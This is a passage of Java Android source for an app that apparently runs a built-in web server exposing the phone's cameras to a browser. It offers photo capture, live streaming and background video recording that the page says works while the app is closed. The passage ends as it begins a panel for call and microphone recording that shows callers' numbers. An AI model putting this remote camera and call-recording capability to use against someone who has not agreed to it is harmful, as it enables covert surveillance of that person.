        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
                html.append("<p>Camera permission not granted.</p>");
                html.append(
                        "<p style=\"margin-top: 10px; font-size: 0.9rem;\">Please grant camera permission in the app settings.</p>");
                html.append("</div>");
                html.append("</div>");
                html.append(HTML_FOOTER);
                return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
            }
        }

        // List available cameras using CameraHelper
        CameraHelper cameraHelper = new CameraHelper(context);
        java.util.List<CameraHelper.CameraInfo> cameras = cameraHelper.getAvailableCameras();

        if (cameras.isEmpty()) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#128247;</div>");
            html.append("<p>No cameras available</p>");
            html.append("</div>");
        } else {
            // Photo Capture Section
            html.append("<div class=\"info-section\">");
            html.append("<h3 style=\"color: #3498db; margin-bottom: 15px;\">&#128247; Photo Capture</h3>");
            html.append(
                    "<p style=\"color: #888; font-size: 0.9rem; margin-bottom: 15px;\">Tap to capture a photo from the selected camera</p>");
            html.append(
                    "<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px;\">");

            for (CameraHelper.CameraInfo cam : cameras) {
                String icon = cam.facing.equals("Front") ? "&#129333;" : "&#128247;";
                String bgColor = cam.facing.equals("Front") ? "rgba(155, 89, 182, 0.2)" : "rgba(52, 152, 219, 0.2)";
                String borderColor = cam.facing.equals("Front") ? "rgba(155, 89, 182, 0.3)" : "rgba(52, 152, 219, 0.3)";
                String textColor = cam.facing.equals("Front") ? "#9b59b6" : "#3498db";

                html.append("<a href=\"/camera/capture?cam=").append(cam.id).append("\" ");
                html.append("style=\"padding: 25px 20px; background: ").append(bgColor).append("; ");
                html.append("border-radius: 15px; text-decoration: none; text-align: center; ");
                html.append("border: 1px solid ").append(borderColor).append("; display: block;\">");
                html.append("<div style=\"font-size: 2.5rem; margin-bottom: 10px;\">").append(icon).append("</div>");
                html.append("<div style=\"color: ").append(textColor).append("; font-weight: 600;\">")
                        .append(cam.facing).append(" Camera</div>");
                html.append("<div style=\"color: #888; font-size: 0.8rem; margin-top: 5px;\">")
                        .append(cam.width).append(" x ").append(cam.height).append("</div>");
                html.append("</a>");
            }
            html.append("</div>");
            html.append("</div>");

            // Live Streaming Section
            html.append("<div class=\"info-section\" style=\"margin-top: 15px;\">");
            html.append("<h3 style=\"color: #e74c3c; margin-bottom: 15px;\">&#128249; Live Streaming</h3>");
            html.append(
                    "<p style=\"color: #888; font-size: 0.9rem; margin-bottom: 15px;\">View live camera feed in your browser</p>");
            html.append(
                    "<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px;\">");

            for (CameraHelper.CameraInfo cam : cameras) {
                String icon = cam.facing.equals("Front") ? "&#129333;" : "&#128249;";
                html.append("<a href=\"/camera/live?cam=").append(cam.id).append("\" ");
                html.append("style=\"padding: 25px 20px; background: rgba(231, 76, 60, 0.2); ");
                html.append("border-radius: 15px; text-decoration: none; text-align: center; ");
                html.append("border: 1px solid rgba(231, 76, 60, 0.3); display: block;\">");
                html.append("<div style=\"font-size: 2.5rem; margin-bottom: 10px;\">").append(icon).append("</div>");
                html.append("<div style=\"color: #e74c3c; font-weight: 600;\">Live ").append(cam.facing)
                        .append("</div>");
                html.append("<div style=\"color: #888; font-size: 0.8rem; margin-top: 5px;\">Click for stream</div>");
                html.append("</a>");
            }
            html.append("</div>");
            html.append("</div>");

            // Video Recording Section
            html.append("<div class=\"info-section\" style=\"margin-top: 15px;\">");
            html.append("<h3 style=\"color: #27ae60; margin-bottom: 15px;\">&#127909; Background Video Recording</h3>");
            html.append(
                    "<p style=\"color: #888; font-size: 0.9rem; margin-bottom: 15px;\">Record video in background - works even when app is closed</p>");
            html.append(
                    "<div id=\"rec-status\" style=\"text-align: center; margin-bottom: 15px; color: #888;\">Checking status...</div>");
            html.append("<div style=\"display: flex; gap: 10px; justify-content: center; flex-wrap: wrap;\">");

            for (CameraHelper.CameraInfo cam : cameras) {
                html.append("<button onclick=\"startRecording('").append(cam.id).append("')\" ");
                html.append("style=\"padding: 15px 25px; background: linear-gradient(135deg, #27ae60, #2ecc71); ");
                html.append("border: none; border-radius: 10px; color: #fff; font-weight: 600; cursor: pointer;\">");
                html.append("&#127909; Record ").append(cam.facing);
                html.append("</button>");
            }

            html.append("<button onclick=\"stopRecording()\" ");
            html.append("style=\"padding: 15px 25px; background: linear-gradient(135deg, #e74c3c, #c0392b); ");
            html.append("border: none; border-radius: 10px; color: #fff; font-weight: 600; cursor: pointer;\">");
            html.append("&#9632; Stop Recording");
            html.append("</button>");
            html.append("</div>");

            // JavaScript for recording
            html.append("<script>");
            html.append("function startRecording(camId) {");
            html.append("  fetch('/camera/record?cam=' + camId).then(r => r.json()).then(d => {");
            html.append(
                    "    document.getElementById('rec-status').innerHTML = '<span style=\"color: #e74c3c;\">&#9679;&nbsp;Recording from camera ' + camId + '...</span>';");
            html.append("  });");
            html.append("}");
            html.append("function stopRecording() {");
            html.append("  fetch('/camera/stop-record').then(r => r.json()).then(d => {");
            html.append(
                    "    document.getElementById('rec-status').innerHTML = '<span style=\"color: #27ae60;\">Recording stopped. ' + (d.path || '') + '</span>';");
            html.append("  });");
            html.append("}");
            html.append("function checkRecStatus() {");
            html.append("  fetch('/camera/status').then(r => r.json()).then(d => {");
            html.append("    if (d.recording) {");
            html.append(
                    "      document.getElementById('rec-status').innerHTML = '<span style=\"color: #e74c3c;\">&#9679;&nbsp;Recording in progress (' + d.duration + 's)</span>';");
            html.append("    } else {");
            html.append(
                    "      document.getElementById('rec-status').innerHTML = '<span style=\"color: #888;\">Not recording</span>';");
            html.append("    }");
            html.append("  });");
            html.append("}");
            html.append("checkRecStatus();");
            html.append("setInterval(checkRecStatus, 2000);");
            html.append("</script>");

            html.append("</div>");
        }

        html.append("</div>");
        html.append(HTML_FOOTER);

        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serveCameraCapture(Map<String, String> params) {
        String cameraId = params.get("cam");
        if (cameraId == null || cameraId.isEmpty()) {
            cameraId = "0"; // Default to back camera
        }

        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin-bottom: 20px;\">&#128247; Capturing Photo...</h2>");

        // Check permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
                html.append("<p>Camera permission not granted.</p>");
                html.append("</div>");
                html.append("</div>");
                html.append(HTML_FOOTER);
                return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
            }
        }

        try {
            CameraHelper cameraHelper = new CameraHelper(context);
            byte[] imageData = cameraHelper.capturePhoto(cameraId);

            if (imageData != null && imageData.length > 0) {
                String base64Image = android.util.Base64.encodeToString(imageData, android.util.Base64.NO_WRAP);

                html.append("<div style=\"text-align: center;\">");
                html.append("<img src=\"data:image/jpeg;base64,").append(base64Image).append("\" ");
                html.append("style=\"max-width: 100%; height: auto; border-radius: 10px; margin-bottom: 20px;\" />");
                html.append("</div>");

                html.append("<div style=\"display: flex; gap: 10px; justify-content: center; flex-wrap: wrap;\">");
                html.append(
                        "<a href=\"/camera\" style=\"padding: 12px 24px; background: rgba(52, 152, 219, 0.2); border-radius: 10px; color: #3498db; text-decoration: none;\">&#8592; Back to Camera</a>");
                html.append("<a href=\"/camera/photo?cam=").append(cameraId).append(
                        "\" style=\"padding: 12px 24px; background: rgba(46, 204, 113, 0.2); border-radius: 10px; color: #2ecc71; text-decoration: none;\">&#8595; Download Photo</a>");
                html.append("<a href=\"/camera/capture?cam=").append(cameraId).append(
                        "\" style=\"padding: 12px 24px; background: rgba(233, 69, 96, 0.2); border-radius: 10px; color: #e94560; text-decoration: none;\">&#128247; Capture Again</a>");
                html.append("</div>");

            } else {
                String error = cameraHelper.getLastError();
                html.append("<div class=\"empty-state\"><div class=\"icon\">&#9888;</div>");
                html.append("<p>Failed to capture photo</p>");
                if (error != null) {
                    html.append("<p style=\"color: #e74c3c; font-size: 0.9rem; margin-top: 10px;\">")
                            .append(escapeHtml(error)).append("</p>");
                }
                html.append(
                        "<a href=\"/camera\" style=\"display: inline-block; margin-top: 20px; padding: 12px 24px; background: rgba(52, 152, 219, 0.2); border-radius: 10px; color: #3498db; text-decoration: none;\">&#8592; Back to Camera</a>");
                html.append("</div>");
            }

        } catch (Exception e) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#9888;</div>");
            html.append("<p>Error: ").append(escapeHtml(e.getMessage())).append("</p>");
            html.append(
                    "<a href=\"/camera\" style=\"display: inline-block; margin-top: 20px; padding: 12px 24px; background: rgba(52, 152, 219, 0.2); border-radius: 10px; color: #3498db; text-decoration: none;\">&#8592; Back to Camera</a>");
            html.append("</div>");
        }

        html.append("</div>");
        html.append(HTML_FOOTER);

        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serveCameraPhoto(Map<String, String> params) {
        String cameraId = params.get("cam");
        if (cameraId == null || cameraId.isEmpty()) {
            cameraId = "0";
        }

        // Check permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                return serveError("Camera permission not granted");
            }
        }

        try {
            CameraHelper cameraHelper = new CameraHelper(context);
            byte[] imageData = cameraHelper.capturePhoto(cameraId);

            if (imageData != null && imageData.length > 0) {
                java.io.ByteArrayInputStream bis = new java.io.ByteArrayInputStream(imageData);
                Response response = newFixedLengthResponse(Response.Status.OK, "image/jpeg", bis, imageData.length);
                response.addHeader("Content-Disposition",
                        "attachment; filename=\"photo_" + cameraId + "_" + System.currentTimeMillis() + ".jpg\"");
                return response;
            } else {
                String error = cameraHelper.getLastError();
                return serveError(error != null ? error : "Failed to capture photo");
            }

        } catch (Exception e) {
            return serveError("Error capturing photo: " + e.getMessage());
        }
    }

    // ============ LIVE STREAMING ============

    private Response serveLiveStreamPage(Map<String, String> params) {
        String camId = params.get("cam");
        if (camId == null)
            camId = "0";

        // Get resolution from params, default to "low" for mobile data optimization
        String res = params.get("res");
        if (res == null)
            res = "low";

        // Resolution presets optimized for different network speeds
        int width, height, quality, fps;
        String resLabel;
        switch (res) {
            case "ultra_low":
                width = 160;
                height = 120;
                quality = 20;
                fps = 2;
                resLabel = "Ultra Low (160x120)";
                break;
            case "very_low":
                width = 240;
                height = 180;
                quality = 25;
                fps = 3;
                resLabel = "Very Low (240x180)";
                break;
            case "low":
            default:
                width = 320;
                height = 240;
                quality = 30;
                fps = 5;
                resLabel = "Low (320x240) - DEFAULT";
                break;
            case "medium":
                width = 480;
                height = 360;
                quality = 40;
                fps = 8;
                resLabel = "Medium (480x360)";
                break;
            case "high":
                width = 640;
                height = 480;
                quality = 50;
                fps = 10;
                resLabel = "High (640x480)";
                break;
            case "very_high":
                width = 800;
                height = 600;
                quality = 60;
                fps = 12;
                resLabel = "Very High (800x600)";
                break;
            case "hd":
                width = 1280;
                height = 720;
                quality = 70;
                fps = 15;
                resLabel = "HD (1280x720)";
                break;
        }

        int refreshRate = 1000 / fps; // Convert FPS to milliseconds

        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin-bottom: 20px;\">&#128249; Live Camera Stream</h2>");

        // Check permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
                html.append("<p>Camera permission not granted.</p>");
                html.append("</div>");
                html.append("</div>");
                html.append(HTML_FOOTER);
                return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
            }
        }

        // Network info banner
        html.append(
                "<div style=\"background: rgba(52, 152, 219, 0.2); padding: 10px 15px; border-radius: 8px; margin-bottom: 15px; text-align: center;\">");
        html.append("<span style=\"color: #3498db; font-size: 0.85rem;\">&#128246; Current: ").append(resLabel);
        html.append(" | ~").append(quality * width * height / 8000).append(" KB/frame</span>");
        html.append("</div>");

        // Live stream viewer
        html.append("<div style=\"text-align: center; margin-bottom: 20px;\">");
        html.append(
                "<div id=\"stream-container\" style=\"position: relative; display: inline-block; background: #000; border-radius: 10px; overflow: hidden; min-height: 180px;\">");
        html.append(
                "<img id=\"stream\" src=\"/camera/frame\" style=\"max-width: 100%; height: auto; display: block;\" ");
        html.append("onerror=\"handleStreamError()\" onload=\"streamLoaded()\" />");
        html.append(
                "<div id=\"stream-overlay\" style=\"position: absolute; top: 10px; left: 10px; background: rgba(0,0,0,0.7); padding: 5px 10px; border-radius: 5px; font-size: 0.8rem;\">");
        html.append("<span id=\"stream-status\" style=\"color: #2ecc71;\">&#9679; LIVE</span>");
        html.append("<span id=\"fps-counter\" style=\"color: #888; margin-left: 10px;\"></span>");
        html.append("</div>");
        html.append(
                "<div id=\"loading\" style=\"position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: #fff;\">Loading...</div>");
        html.append(
                "<div id=\"rec-indicator\" style=\"position: absolute; top: 10px; right: 10px; background: rgba(231, 76, 60, 0.9); padding: 5px 10px; border-radius: 5px; font-size: 0.8rem; display: none;\">");
        html.append("<span style=\"color: #fff;\">&#9679; REC</span>");
        html.append("</div>");
        html.append("</div>");
        html.append("</div>");

        // Resolution selector
        html.append("<div style=\"margin-bottom: 20px; text-align: center;\">");
        html.append(
                "<h4 style=\"color: #888; margin-bottom: 10px; font-size: 0.9rem;\">&#128246; Resolution (for slow internet, choose lower)</h4>");
        html.append("<div style=\"display: flex; gap: 8px; justify-content: center; flex-wrap: wrap;\">");

        String[] resOptions = { "ultra_low", "very_low", "low", "medium", "high", "very_high", "hd" };
        String[] resNames = { "Ultra Low", "Very Low", "Low", "Medium", "High", "Very High", "HD" };
        for (int i = 0; i < resOptions.length; i++) {
            String selected = resOptions[i].equals(res) ? "background: #e94560; color: #fff;"
                    : "background: rgba(255,255,255,0.1);";
            html.append("<a href=\"/camera/live?cam=").append(camId).append("&res=").append(resOptions[i])
                    .append("\" ");
            html.append("style=\"padding: 8px 12px; ").append(selected)
                    .append(" border-radius: 6px; color: #fff; text-decoration: none; font-size: 0.8rem;\">");
            html.append(resNames[i]);
            html.append("</a>");
        }
        html.append("</div>");
        html.append("</div>");

        // Camera selection
        html.append(
                "<div style=\"display: flex; gap: 10px; justify-content: center; flex-wrap: wrap; margin-bottom: 20px;\">");
        CameraHelper cameraHelper = new CameraHelper(context);
        java.util.List<CameraHelper.CameraInfo> cameras = cameraHelper.getAvailableCameras();
        for (CameraHelper.CameraInfo cam : cameras) {
            String selected = cam.id.equals(camId) ? "background: #e94560; color: #fff;" : "";
            html.append("<a href=\"/camera/live?cam=").append(cam.id).append("&res=").append(res).append("\" ");
            html.append(
                    "style=\"padding: 10px 20px; background: rgba(255,255,255,0.1); border-radius: 8px; color: #fff; text-decoration: none; ")
                    .append(selected).append("\">");
            html.append(cam.facing).append(" Camera");
            html.append("</a>");
        }
        html.append("</div>");

        // Action buttons
        html.append("<div style=\"display: flex; gap: 10px; justify-content: center; flex-wrap: wrap;\">");
        html.append(
                "<button onclick=\"capturePhoto()\" style=\"padding: 12px 24px; background: linear-gradient(135deg, #3498db, #2980b9); border: none; border-radius: 10px; color: #fff; font-weight: 600; cursor: pointer;\">&#128247; Capture Photo</button>");
        html.append(
                "<button id=\"rec-btn\" onclick=\"toggleRecording()\" style=\"padding: 12px 24px; background: linear-gradient(135deg, #e74c3c, #c0392b); border: none; border-radius: 10px; color: #fff; font-weight: 600; cursor: pointer;\">&#9679; Start Recording</button>");
        html.append(
                "<a href=\"/camera\" style=\"padding: 12px 24px; background: rgba(255,255,255,0.1); border-radius: 10px; color: #fff; text-decoration: none;\">&#8592; Back</a>");
        html.append("</div>");

        // Status
        html.append(
                "<div id=\"status\" style=\"text-align: center; margin-top: 20px; color: #888; font-size: 0.9rem;\"></div>");

        // JavaScript for live stream with optimizations
        html.append("<script>");
        html.append("var camId = '").append(camId).append("';");
        html.append("var streamWidth = ").append(width).append(";");
        html.append("var streamHeight = ").append(height).append(";");
        html.append("var streamQuality = ").append(quality).append(";");
        html.append("var refreshRate = ").append(refreshRate).append(";");
        html.append("var isRecording = false;");
        html.append("var streamImg = document.getElementById('stream');");
        html.append("var loadingDiv = document.getElementById('loading');");
        html.append("var fpsCounter = document.getElementById('fps-counter');");
        html.append("var frameCount = 0;");
        html.append("var lastFpsTime = Date.now();");
        html.append("var errorCount = 0;");
        html.append("var streamActive = true;");

        // Start streaming with current resolution
        html.append("function startStream() {");
        html.append(
                "  fetch('/camera/start-stream?cam=' + camId + '&width=' + streamWidth + '&height=' + streamHeight + '&quality=' + streamQuality);");
        html.append("  setTimeout(refreshFrame, 1000);");
        html.append("}");

        // Handle stream load success
        html.append("function streamLoaded() {");
        html.append("  loadingDiv.style.display = 'none';");
        html.append("  errorCount = 0;");
        html.append("  frameCount++;");
        html.append("  var now = Date.now();");
        html.append("  if (now - lastFpsTime >= 1000) {");
        html.append("    fpsCounter.innerHTML = frameCount + ' fps';");
        html.append("    frameCount = 0;");
        html.append("    lastFpsTime = now;");
        html.append("  }");
        html.append("}");

        // Handle stream error with retry
        html.append("function handleStreamError() {");
        html.append("  errorCount++;");
        html.append("  if (errorCount < 10) {");
        html.append("    setTimeout(function() { streamImg.src = '/camera/frame?t=' + Date.now(); }, 500);");
        html.append("  } else {");
        html.append(
                "    loadingDiv.innerHTML = 'Stream error. <a href=\"javascript:location.reload()\" style=\"color:#e94560\">Reload</a>';");
        html.append("  }");
        html.append("}");

        // Refresh frame with adaptive timing
        html.append("function refreshFrame() {");
        html.append("  if (!streamActive) return;");
        html.append("  streamImg.src = '/camera/frame?t=' + Date.now();");
        html.append("  setTimeout(refreshFrame, refreshRate);");
        html.append("}");

        // Capture photo
        html.append("function capturePhoto() {");
        html.append("  window.open('/camera/photo?cam=' + camId, '_blank');");
        html.append("}");

        // Toggle recording
        html.append("function toggleRecording() {");
        html.append("  var btn = document.getElementById('rec-btn');");
        html.append("  var indicator = document.getElementById('rec-indicator');");
        html.append("  if (isRecording) {");
        html.append("    fetch('/camera/stop-record').then(r => r.json()).then(d => {");
        html.append("      document.getElementById('status').innerHTML = d.message;");
        html.append("      btn.innerHTML = '&#9679; Start Recording';");
        html.append("      btn.style.background = 'linear-gradient(135deg, #e74c3c, #c0392b)';");
        html.append("      indicator.style.display = 'none';");
        html.append("      isRecording = false;");
        html.append("    });");
        html.append("  } else {");
        html.append("    fetch('/camera/record?cam=' + camId).then(r => r.json()).then(d => {");
        html.append("      document.getElementById('status').innerHTML = d.message;");
        html.append("      btn.innerHTML = '&#9632; Stop Recording';");
        html.append("      btn.style.background = 'linear-gradient(135deg, #27ae60, #2ecc71)';");
        html.append("      indicator.style.display = 'block';");
        html.append("      isRecording = true;");
        html.append("    });");
        html.append("  }");
        html.append("}");

        // Check status
        html.append("function checkStatus() {");
        html.append("  fetch('/camera/status').then(r => r.json()).then(d => {");
        html.append("    if (d.recording) {");
        html.append("      document.getElementById('rec-indicator').style.display = 'block';");
        html.append("      document.getElementById('rec-btn').innerHTML = '&#9632; Stop Recording';");
        html.append("      isRecording = true;");
        html.append("    }");
        html.append("  }).catch(e => {});");
        html.append("}");

        // Stop stream when leaving page
        html.append("window.onbeforeunload = function() { streamActive = false; };");

        html.append("startStream();");
        html.append("checkStatus();");
        html.append("</script>");

        html.append("</div>");
        html.append(HTML_FOOTER);

        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serveMJPEGStream(Map<String, String> params) {
        // Start stream if not already - use low resolution by default for mobile data
        if (!CameraService.isCurrentlyStreaming()) {
            String camId = params.get("cam");
            // Default to 320x240 with low quality for mobile data compatibility
            startCameraStreamInternal(camId != null ? camId : "0", 320, 240, 30);
            try {
                Thread.sleep(800); // Give more time for camera to start
            } catch (InterruptedException e) {
            }
        }

        // Return single frame for simplicity (MJPEG multipart is complex with
        // NanoHTTPD)
        return serveSingleFrame();
    }

    private Response serveSingleFrame() {
        byte[] frame = CameraService.getNextFrame(200);
        if (frame != null && frame.length > 0) {
            java.io.ByteArrayInputStream bis = new java.io.ByteArrayInputStream(frame);
            Response response = newFixedLengthResponse(Response.Status.OK, "image/jpeg", bis, frame.length);
            response.addHeader("Cache-Control", "no-cache, no-store, must-revalidate");
            response.addHeader("Pragma", "no-cache");
            response.addHeader("Expires", "0");
            return response;
        } else {
            // Return a 1x1 transparent pixel as fallback
            byte[] pixel = new byte[] {
                    (byte) 0xFF, (byte) 0xD8, (byte) 0xFF, (byte) 0xE0, 0x00, 0x10, 0x4A, 0x46,
                    0x49, 0x46, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00,
                    (byte) 0xFF, (byte) 0xDB, 0x00, 0x43, 0x00, 0x08, 0x06, 0x06, 0x07, 0x06,
                    0x05, 0x08, 0x07, 0x07, 0x07, 0x09, 0x09, 0x08, 0x0A, 0x0C, 0x14, 0x0D,
                    0x0C, 0x0B, 0x0B, 0x0C, 0x19, 0x12, 0x13, 0x0F, 0x14, 0x1D, 0x1A, 0x1F,
                    0x1E, 0x1D, 0x1A, 0x1C, 0x1C, 0x20, 0x24, 0x2E, 0x27, 0x20, 0x22, 0x2C,
                    0x23, 0x1C, 0x1C, 0x28, 0x37, 0x29, 0x2C, 0x30, 0x31, 0x34, 0x34, 0x34,
                    0x1F, 0x27, 0x39, 0x3D, 0x38, 0x32, 0x3C, 0x2E, 0x33, 0x34, 0x32,
                    (byte) 0xFF, (byte) 0xC0, 0x00, 0x0B, 0x08, 0x00, 0x01, 0x00, 0x01, 0x01,
                    0x01, 0x11, 0x00, (byte) 0xFF, (byte) 0xC4, 0x00, 0x1F, 0x00, 0x00, 0x01,
                    0x05, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09,
                    0x0A, 0x0B, (byte) 0xFF, (byte) 0xC4, 0x00, (byte) 0xB5, 0x10, 0x00, 0x02,
                    0x01, 0x03, 0x03, 0x02, 0x04, 0x03, 0x05, 0x05, 0x04, 0x04, 0x00, 0x00,
                    0x01, 0x7D, (byte) 0xFF, (byte) 0xDA, 0x00, 0x08, 0x01, 0x01, 0x00, 0x00,
                    0x3F, 0x00, 0x7F, (byte) 0xFF, (byte) 0xD9
            };
            java.io.ByteArrayInputStream bis = new java.io.ByteArrayInputStream(pixel);
            Response response = newFixedLengthResponse(Response.Status.OK, "image/jpeg", bis, pixel.length);
            response.addHeader("Cache-Control", "no-cache");
            return response;
        }
    }

    private Response startCameraStream(Map<String, String> params) {
        String camId = params.get("cam");
        String widthStr = params.get("width");
        String heightStr = params.get("height");
        String qualityStr = params.get("quality");

        int width = 640, height = 480, quality = 50;
        try {
            if (widthStr != null)
                width = Integer.parseInt(widthStr);
            if (heightStr != null)
                height = Integer.parseInt(heightStr);
            if (qualityStr != null)
                quality = Integer.parseInt(qualityStr);
        } catch (Exception e) {
        }

        startCameraStreamInternal(camId != null ? camId : "0", width, height, quality);

        String json = "{\"success\": true, \"message\": \"Stream started\", \"camera\": \"" +
                (camId != null ? camId : "0") + "\"}";
        return newFixedLengthResponse(Response.Status.OK, "application/json", json);
    }

    private void startCameraStreamInternal(String camId, int width, int height, int quality) {
        android.content.Intent intent = new android.content.Intent(context, CameraService.class);
        intent.setAction("START_STREAM");
        intent.putExtra("cameraId", camId);
        intent.putExtra("width", width);
        intent.putExtra("height", height);
        intent.putExtra("quality", quality);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }
    }

    private Response stopCameraStream() {
        android.content.Intent intent = new android.content.Intent(context, CameraService.class);
        intent.setAction("STOP_STREAM");
        context.startService(intent);

        String json = "{\"success\": true, \"message\": \"Stream stopped\"}";
        return newFixedLengthResponse(Response.Status.OK, "application/json", json);
    }

    private Response startVideoRecording(Map<String, String> params) {
        String camId = params.get("cam");
        String widthStr = params.get("width");
        String heightStr = params.get("height");

        int width = 1280, height = 720;
        try {
            if (widthStr != null)
                width = Integer.parseInt(widthStr);
            if (heightStr != null)
                height = Integer.parseInt(heightStr);
        } catch (Exception e) {
        }

        android.content.Intent intent = new android.content.Intent(context, CameraService.class);
        intent.setAction("START_RECORDING");
        intent.putExtra("cameraId", camId != null ? camId : "0");
        intent.putExtra("width", width);
        intent.putExtra("height", height);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }

        String json = "{\"success\": true, \"message\": \"Recording started\", \"camera\": \"" +
                (camId != null ? camId : "0") + "\"}";
        return newFixedLengthResponse(Response.Status.OK, "application/json", json);
    }

    private Response stopVideoRecording() {
        android.content.Intent intent = new android.content.Intent(context, CameraService.class);
        intent.setAction("STOP_RECORDING");
        context.startService(intent);

        String videoPath = CameraService.getCurrentVideoPath();
        String json = "{\"success\": true, \"message\": \"Recording stopped\"" +
                (videoPath != null ? ", \"path\": \"" + videoPath + "\"" : "") + "}";
        return newFixedLengthResponse(Response.Status.OK, "application/json", json);
    }

    private Response serveCameraStatus() {
        boolean streaming = CameraService.isCurrentlyStreaming();
        boolean recording = CameraService.isCurrentlyRecording();
        String currentCamera = CameraService.getCurrentCameraId();
        long duration = CameraService.getRecordingDuration();
        String videoPath = CameraService.getCurrentVideoPath();

        String json = String.format(
                "{\"streaming\": %s, \"recording\": %s, \"camera\": \"%s\", \"duration\": %d, \"videoPath\": %s}",
                streaming, recording, currentCamera, duration,
                videoPath != null ? "\"" + videoPath + "\"" : "null");
        return newFixedLengthResponse(Response.Status.OK, "application/json", json);
    }

    // ============ AUDIO/MICROPHONE RECORDING ============

    private Response serveAudioPage() {
        boolean isRecording = CallRecordService.isRecording();
        boolean isRecordingCall = CallRecordService.isRecordingCall();
        boolean isRecordingMic = CallRecordService.isRecordingMic();
        boolean callInProgress = CallRecordService.isCallInProgress();
        String callNumber = CallRecordService.getCurrentCallNumber();
        String callType = CallRecordService.getCurrentCallType();
        long duration = CallRecordService.getRecordingDuration();
        boolean autoRecordEnabled = CallRecordService.isAutoRecordEnabled();
        boolean saveOnDeviceEnabled = CallRecordService.isSaveOnDeviceEnabled();

        String html = HTML_HEADER +
                "<style>" +
                ".status-card { padding: 20px; background: rgba(255,255,255,0.05); border-radius: 15px; margin-bottom: 20px; border: 1px solid rgba(255,255,255,0.1); }"
                +
                ".status-active { border-color: #2ecc71; background: rgba(46, 204, 113, 0.1); }" +
                ".status-inactive { border-color: #e74c3c; background: rgba(231, 76, 60, 0.1); }" +
                ".status-warning { border-color: #f39c12; background: rgba(243, 156, 18, 0.1); }" +
                ".btn { padding: 12px 24px; border-radius: 10px; text-decoration: none; display: inline-block; margin: 5px; font-weight: 600; cursor: pointer; border: none; font-size: 0.9rem; }"
                +
                ".btn-primary { background: linear-gradient(135deg, #e94560, #ff6b6b); color: white; }" +
                ".btn-success { background: linear-gradient(135deg, #2ecc71, #27ae60); color: white; }" +
                ".btn-danger { background: linear-gradient(135deg, #e74c3c, #c0392b); color: white; }" +
                ".btn-warning { background: linear-gradient(135deg, #f39c12, #e67e22); color: white; }" +
                ".toggle-container { display: flex; align-items: center; gap: 10px; margin: 10px 0; }" +
                ".toggle-switch { position: relative; width: 50px; height: 26px; background: #555; border-radius: 13px; cursor: pointer; transition: all 0.3s; }"
                +
                ".toggle-switch.active { background: #2ecc71; }" +
                ".toggle-switch::after { content: ''; position: absolute; width: 22px; height: 22px; border-radius: 50%; background: white; top: 2px; left: 2px; transition: all 0.3s; }"
                +
                ".toggle-switch.active::after { left: 26px; }" +
                ".call-alert { padding: 20px; background: linear-gradient(135deg, rgba(46, 204, 113, 0.3), rgba(39, 174, 96, 0.2)); border-radius: 15px; margin-bottom: 20px; border: 2px solid #2ecc71; animation: pulse 2s infinite; }"
                +
                "@keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; } }" +
                ".recording-indicator { display: inline-flex; align-items: center; gap: 8px; padding: 8px 16px; background: rgba(231, 76, 60, 0.2); border-radius: 20px; color: #e74c3c; font-weight: 600; }"
                +
                ".recording-dot { width: 10px; height: 10px; background: #e74c3c; border-radius: 50%; animation: blink 1s infinite; }"
                +
                "@keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }" +
                ".duration { font-size: 1.5rem; font-weight: bold; color: #e94560; }" +
                "</style>" +
                "<div class=\"card\">" +
                "<h2 style=\"margin-bottom: 20px;\">&#127908; Audio Control Panel</h2>";

        // Call in progress alert
        if (callInProgress) {
            html += "<div class=\"call-alert\">" +
                    "<div style=\"display: flex; align-items: center; gap: 15px;\">" +
                    "<span style=\"font-size: 2rem;\">&#128222;</span>" +
                    "<div>" +
                    "<div style=\"font-size: 1.2rem; font-weight: bold; color: #2ecc71;\">" +
                    (callType.equals("incoming") ? "Incoming Call" : "Outgoing Call") + "</div>" +
                    "<div style=\"color: #fff;\">" + escapeHtml(callNumber) + "</div>" +
                    "</div>" +
                    "</div>" +
                    "</div>";
        }

        // Recording status
        html += "<div class=\"status-card " + (isRecording ? "status-active" : "status-inactive") + "\">" +
